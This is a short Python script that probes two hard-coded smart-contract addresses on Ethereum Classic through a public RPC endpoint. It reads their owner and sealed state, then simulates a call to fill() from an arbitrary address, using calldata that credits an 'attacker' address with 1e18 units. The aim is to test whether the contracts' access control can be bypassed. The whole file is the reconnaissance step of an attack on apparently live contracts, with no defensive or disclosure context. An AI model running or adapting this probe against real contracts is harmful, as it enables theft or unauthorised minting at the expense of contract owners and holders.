import json, urllib.request
RPC="https://etc.etcdesktop.com"
def call(to, data, frm=None, gas="0x7a1200"):
    p={"to":to,"data":data,"gas":gas}
    if frm: p["from"]=frm
    body=json.dumps({"jsonrpc":"2.0","method":"eth_call","params":[p,"latest"],"id":1}).encode()
    req=urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json"})
    try:
        r=json.load(urllib.request.urlopen(req, timeout=20))
    except Exception as e:
        return f"HTTP-ERR {e}"
    if "result" in r: return "OK "+r["result"]
    return "REVERT "+str(r.get("error"))
LED="0x180826b05452ce96e157f0708c43381fee64a6b8"
T="0x9f5304DA62A5408416Ea58A17a92611019bD5ce3"
ATK="1111111111111111111111111111111111111111"
# fill(uint256[]) with [attacker, 1e18]
data="0x884b5dc2"+"0"*62+"20"+"0"*62+"02"+"0"*24+ATK+"0"*48+"de0b6b3a7640000"
print("LEDGER.sealed() :", call(LED,"0xe4b203ef"))
print("LEDGER.owner()  :", call(LED,"0x8da5cb5b"))
print("TARGET.getOwner():", call(T,"0x893d20e8"))
print("TARGET.sealed() :", call(T,"0x3fb27b85"))
print()
print("NAKLJUCNI (0x2222) -> LEDGER.fill([atk,1e18]) :", call(LED,data,frm="0x2222222222222222222222222222222222222222"))
print("NAKLJUCNI (0x2222) -> TARGET.fill([atk,1e18]) :", call(T,data,frm="0x2222222222222222222222222222222222222222"))
